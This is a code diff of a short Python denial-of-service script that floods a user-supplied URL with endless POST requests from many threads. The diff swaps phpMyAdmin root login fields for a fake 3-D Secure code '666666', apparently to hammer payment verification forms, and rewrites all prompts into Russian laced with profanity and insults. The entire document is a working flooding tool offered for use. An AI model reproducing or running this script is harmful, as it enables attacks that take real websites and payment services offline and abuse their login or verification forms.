@@ -7,30 +7,30 @@ import cloudscraper
 def dos(target):
     while True:
         try:
-            res = requests.post(url, data={'pma_username': 'root', 'pma_password': 'fGerhet22'})
-            print("Sent")
+            res = requests.post(url, data={'3dscode': '666666',})
+            print("Код выслан")
         except requests.exceptions.ConnectionError:
-            print("Server down")
+            print("Cука пиздец гг")
 
 threads = 20
 
-url = input("link ")
+url = input("Вставь ссылОчку ")
 
 try:
-    threads = int(input("Threads"))
+    threads = int(input("Сколько потоков ебанем (только расчитывай на возможности своего кампухтера и инета): "))
 except ValueError:
-    exit("you are dumb ")
+    exit("ты дебил")
 
 if threads == 0:
-    exit("oh fuck")
+    exit("блять еблан")
 
 if not url.__contains__("http"):
-    exit("provide full domain plz")
+    exit("блять напиши домен фулл")
 
 if not url.__contains__("."):
-    exit("fucking slaves")
+    exit("еблан домен не тот")
 
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
     thr.start()
-    print(str(i + 1) + " threads started!")
+    print(str(i + 1) + " потоков запущено!")
